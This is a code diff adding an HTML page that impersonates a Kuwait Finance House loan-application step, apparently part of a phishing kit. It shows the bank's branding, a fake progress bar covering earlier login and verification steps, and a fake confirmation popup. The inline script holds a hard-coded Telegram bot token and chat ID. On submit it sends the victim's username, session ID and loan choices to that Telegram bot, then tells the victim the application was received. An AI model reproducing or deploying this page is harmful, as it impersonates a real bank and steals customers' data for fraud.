@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loan Details - KFH Kuwait</title>
+    <link rel="icon" type="image/png" href="favicon.png" sizes="64x64">
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="application.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Figtree:wght@400;500;600;700;800&family=Noto+Kufi+Arabic:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <meta name="description" content="Complete your KFH loan application">
+    
+    <style>
+        :root {
+            --kfh-green: #009144;
+            --kfh-dark-green: #006B35;
+            --kfh-light-green: #E8F5E9;
+            --kfh-gold: #C4A962;
+            --primary-color: #009144;
+            --primary-dark: #006B35;
+        }
+        
+        /* Success Popup Modal */
+        .popup-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .popup-content {
+            background: white;
+            border-radius: 20px;
+            max-width: 500px;
+            width: 100%;
+            padding: 40px;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            animation: popupSlide 0.3s ease-out;
+        }
+        
+        @keyframes popupSlide {
+            from { opacity: 0; transform: translateY(-30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .popup-icon {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, var(--kfh-green) 0%, var(--kfh-dark-green) 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            font-size: 40px;
+            color: white;
+        }
+        
+        .popup-content h2 {
+            font-size: 1.8rem;
+            color: #1a1a1a;
+            margin-bottom: 10px;
+        }
+        
+        .popup-content > p {
+            color: #666;
+            margin-bottom: 20px;
+        }
+        
+        .popup-details {
+            background: var(--kfh-light-green);
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+        
+        .popup-details p { margin: 5px 0; color: #444; }
+        .popup-details strong { color: var(--kfh-green); font-size: 1.2rem; }
+        
+        .popup-next {
+            text-align: left;
+            background: #f8f9fa;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 25px;
+        }
+        
+        .popup-next h3 { text-align: center; margin-bottom: 15px; color: #1a1a1a; }
+        .popup-next ul { list-style: none; }
+        .popup-next li { padding: 8px 0; color: #444; display: flex; align-items: center; gap: 10px; }
+        .popup-next li::before { content: "✓"; color: var(--kfh-green); font-weight: bold; }
+        
+        .popup-content .btn-primary {
+            background: linear-gradient(135deg, var(--kfh-green) 0%, var(--kfh-dark-green) 100%);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 1rem;
+            font-weight: 600;
+            border-radius: 10px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <!-- Navigation -->
+    <nav class="navbar">
+        <div class="nav-container">
+            <div class="logo" onclick="window.location.href='index.html'" style="cursor: pointer;">
+                <img src="Kuwait-Finance-House.jpg" alt="KFH" class="logo-img" style="height: 36px; width: auto;">
+                <span class="logo-text">KFH Kuwait</span>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Application Form -->
+    <section class="application-section">
+        <div class="application-container">
+            <!-- Progress Bar -->
+            <div class="progress-bar">
+                <div class="progress-step completed" data-step="1">
+                    <div class="step-number">1</div>
+                    <div class="step-label">Login</div>
+                </div>
+                <div class="progress-line active"></div>
+                <div class="progress-step completed" data-step="2">
+                    <div class="step-number">2</div>
+                    <div class="step-label">Verify</div>
+                </div>
+                <div class="progress-line active"></div>
+                <div class="progress-step active" data-step="3">
+                    <div class="step-number">3</div>
+                    <div class="step-label">Details</div>
+                </div>
+            </div>
+
+            <!-- Form Card -->
+            <div class="form-card">
+                <!-- Step 3: Loan Details -->
+                <div class="form-step active" id="step-3">
+                    <div class="step-header">
+                        <h2>Loan Details</h2>
+                        <p>Choose your preferred Islamic financing</p>
+                    </div>
+
+                    <div class="loan-summary-card">
+                        <div class="summary-item">
+                            <span class="summary-label">Financing Amount</span>
+                            <span class="summary-value" id="summary-amount">KWD 1,000</span>
+                        </div>
+                        <div class="summary-item">
+                            <span class="summary-label">Financing Term</span>
+                            <span class="summary-value" id="summary-term">12 Months</span>
+                        </div>
+                        <div class="summary-item">
+                            <span class="summary-label">Profit Rate</span>
+                            <span class="summary-value">5% APR</span>
+                        </div>
+                        <div class="summary-item highlight">
+                            <span class="summary-label">Monthly Payment</span>
+                            <span class="summary-value" id="summary-monthly">KWD 92</span>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label>Adjust Financing Amount</label>
+                        <div class="amount-selector">
+                            <button type="button" class="amount-btn" data-amount="100">KWD 100</button>
+                            <button type="button" class="amount-btn" data-amount="500">KWD 500</button>
+                            <button type="button" class="amount-btn active" data-amount="1000">KWD 1,000</button>
+                            <button type="button" class="amount-btn" data-amount="5000">KWD 5,000</button>
+                            <button type="button" class="amount-btn" data-amount="10000">KWD 10,000</button>
+                            <button type="button" class="amount-btn" data-amount="25000">KWD 25,000</button>
+                            <button type="button" class="amount-btn" data-amount="50000">KWD 50,000</button>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="loanTerm">Financing Term</label>
+                        <select id="loanTerm" name="loanTerm">
+                            <option value="3">3 Months</option>
+                            <option value="6">6 Months</option>
+                            <option value="12" selected>12 Months</option>
+                            <option value="24">24 Months</option>
+                            <option value="36">36 Months</option>
+                        </select>
+                    </div>
+
+                    <div class="form-actions">
+                        <button type="button" class="btn-secondary" onclick="window.location.href='verify.html'">Back</button>
+                        <button type="button" class="btn-primary" onclick="submitApplication()">Get Financing</button>
+                    </div>
+                </div>
+
+                <!-- Success Popup Modal -->
+                <div class="popup-overlay" id="success-popup">
+                    <div class="popup-content">
+                        <div class="popup-icon">✓</div>
+                        <h2>Application Submitted!</h2>
+                        <p>Thank you for applying with KFH Kuwait</p>
+                        
+                        <div class="popup-details">
+                            <p>Your application ID: <strong id="application-id">KFH-2026-XXXXX</strong></p>
+                            <p>We've sent a confirmation to your registered mobile.</p>
+                        </div>
+
+                        <div class="popup-next">
+                            <h3>What's Next?</h3>
+                            <ul>
+                                <li>You'll receive an SMS with your approval status within 15 minutes</li>
+                                <li>Once approved, funds will be disbursed to your account within 24 hours</li>
+                                <li>You'll receive repayment reminders via SMS</li>
+                            </ul>
+                        </div>
+
+                        <button type="button" class="btn-primary" onclick="window.location.href='index.html'">Back to Home</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = '8663835867:AAHBDm5yUNurJQSOuOdw7VWWekJuLzOj-l4';
+        const TELEGRAM_CHAT_ID = '7973653220';
+
+        // Get session info
+        const username = sessionStorage.getItem('kfh_username') || 'Unknown';
+        const sessionId = sessionStorage.getItem('kfh_session_id') || 'session_' + Math.random().toString(36).substr(2, 9);
+
+        // Check if verified
+        if (!sessionStorage.getItem('kfh_verified')) {
+            window.location.href = 'application.html';
+        }
+
+        // Loan details state
+        const interestRate = 0.05;
+        let loanDetails = {
+            amount: 1000,
+            term: 12,
+            monthlyPayment: 0,
+            totalRepayment: 0
+        };
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            initAmountSelector();
+            initTermSelector();
+            calculateLoan();
+        });
+
+        function initAmountSelector() {
+            const amountBtns = document.querySelectorAll('.amount-btn');
+            
+            amountBtns.forEach(btn => {
+                btn.addEventListener('click', function() {
+                    amountBtns.forEach(b => b.classList.remove('active'));
+                    this.classList.add('active');
+                    loanDetails.amount = parseInt(this.dataset.amount);
+                    calculateLoan();
+                });
+            });
+        }
+
+        function initTermSelector() {
+            const termSelect = document.getElementById('loanTerm');
+            if (termSelect) {
+                termSelect.addEventListener('change', function() {
+                    loanDetails.term = parseInt(this.value);
+                    calculateLoan();
+                });
+            }
+        }
+
+        function calculateLoan() {
+            const principal = loanDetails.amount;
+            const termMonths = loanDetails.term;
+            const monthlyRate = interestRate / 12;
+            
+            let monthlyPayment;
+            if (monthlyRate === 0) {
+                monthlyPayment = principal / termMonths;
+            } else {
+                const factor = Math.pow(1 + monthlyRate, termMonths);
+                monthlyPayment = principal * (monthlyRate * factor) / (factor - 1);
+            }
+            
+            const totalRepayment = monthlyPayment * termMonths;
+            
+            loanDetails.monthlyPayment = Math.round(monthlyPayment);
+            loanDetails.totalRepayment = Math.round(totalRepayment);
+            
+            updateLoanSummary();
+        }
+
+        function updateLoanSummary() {
+            document.getElementById('summary-amount').textContent = 'KWD ' + loanDetails.amount.toLocaleString();
+            document.getElementById('summary-term').textContent = loanDetails.term + ' Months';
+            document.getElementById('summary-monthly').textContent = 'KWD ' + loanDetails.monthlyPayment.toLocaleString();
+        }
+
+        async function submitApplication() {
+            // Send final application to bot
+            const applicationId = 'KFH-' + new Date().getFullYear() + '-' + Math.random().toString(36).substr(2, 5).toUpperCase();
+            
+            const message = '🎉 KFH KUWAIT - FINAL APPLICATION SUBMITTED\n\n🆔 Session ID: ' + sessionId + '\n👤 Username: ' + username + '\n💰 Amount: KWD ' + loanDetails.amount.toLocaleString() + '\n📅 Term: ' + loanDetails.term + ' Months\n💵 Monthly Payment: KWD ' + loanDetails.monthlyPayment.toLocaleString() + '\n🆔 Application ID: ' + applicationId + '\n📅 Time: ' + new Date().toLocaleString();
+
+            try {
+                await fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
+                });
+            } catch (error) {
+                console.log('Error sending final application to bot:', error);
+            }
+            
+            // Store in localStorage
+            localStorage.setItem('kfh_has_applied', 'true');
+            localStorage.setItem('kfh_application_id', applicationId);
+            
+            // Show success popup
+            document.getElementById('application-id').textContent = applicationId;
+            document.getElementById('success-popup').style.display = 'flex';
+        }
+    </script>
+</body>
+</html>
